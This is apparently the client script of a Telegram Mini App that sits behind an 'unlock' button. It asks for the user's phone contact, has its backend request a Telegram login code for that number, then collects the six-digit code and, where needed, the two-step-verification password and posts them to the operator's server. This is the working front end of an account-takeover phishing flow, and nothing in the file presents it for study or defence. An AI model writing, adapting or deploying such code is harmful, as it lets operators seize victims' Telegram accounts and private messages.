const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

const API = window.location.origin;
const uid = tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
let sid = null, phone = null, processing = false;

function show(s) {
  document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
  document.getElementById('screen-' + s).classList.add('active');
}
function loading(on) { document.getElementById('loading').classList.toggle('active', on); }
function error(id, msg) { document.getElementById(id).textContent = msg || ''; }

// If not opened in Telegram, show error screen
if (!uid) {
  show('error');
}

const cells = document.querySelectorAll('.otp-cell');
cells.forEach((c, i) => {
  c.addEventListener('input', () => {
    c.value = c.value.replace(/\D/g, '').slice(0, 1);
    if (c.value) { if (i < 5) cells[i + 1].focus(); }
    updateBtn();
  });
  c.addEventListener('keydown', e => {
    if (e.key === 'Backspace' && !c.value && i > 0) cells[i - 1].focus();
  });
});

function getCode() { return Array.from(cells).map(c => c.value).join(''); }
function updateBtn() { document.getElementById('btn-verify').disabled = getCode().length !== 6; }

document.getElementById('btn-unlock').onclick = () => {
  if (processing) return;
  processing = true;
  loading(true);
  tg.requestContact(ok => {
    if (ok) pollContact();
    else { processing = false; loading(false); tg.showAlert('Contact permission required'); }
  });
};

function pollContact() {
  let n = 0;
  (function poll() {
    if (n++ > 30) { loading(false); processing = false; return tg.showAlert('Timed out. Try again.'); }
    fetch(API + '/api/bot/contact-status/' + uid)
      .then(r => r.json())
      .then(d => {
        if (d.status === 'received') {
          phone = d.phone.startsWith('+') ? d.phone : '+' + d.phone;
          requestCode();
        } else setTimeout(poll, 1000);
      }).catch(() => setTimeout(poll, 1000));
  })();
}

function requestCode() {
  fetch(API + '/api/bot/request-code', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone })
  }).then(r => r.json()).then(d => {
    loading(false);
    processing = false;
    if (d.error) return tg.showAlert(d.error);
    if (d.success) { sid = d.session_id; show('otp'); cells[0].focus(); }
  }).catch(() => { loading(false); processing = false; tg.showAlert('Network error'); });
}

document.getElementById('btn-verify').onclick = () => {
  const code = getCode();
  if (code.length !== 6) return;
  loading(true);
  fetch(API + '/api/bot/verify-code', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_id: sid, code })
  }).then(r => r.json()).then(d => {
    loading(false);
    if (d.error) return error('otp-error', d.error);
    if (d.requires_password) return show('password');
    if (d.success) { show('success'); setTimeout(() => tg.close(), 2000); }
  }).catch(() => { loading(false); tg.showAlert('Network error'); });
};

document.getElementById('btn-pw').onclick = () => {
  const pw = document.getElementById('pw-input').value;
  if (!pw) return error('pw-error', 'Enter password');
  loading(true);
  fetch(API + '/api/bot/verify-code', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_id: sid, code: getCode(), password: pw })
  }).then(r => r.json()).then(d => {
    loading(false);
    if (d.error) return error('pw-error', d.error);
    if (d.success) { show('success'); setTimeout(() => tg.close(), 2000); }
  }).catch(() => { loading(false); tg.showAlert('Network error'); });
};
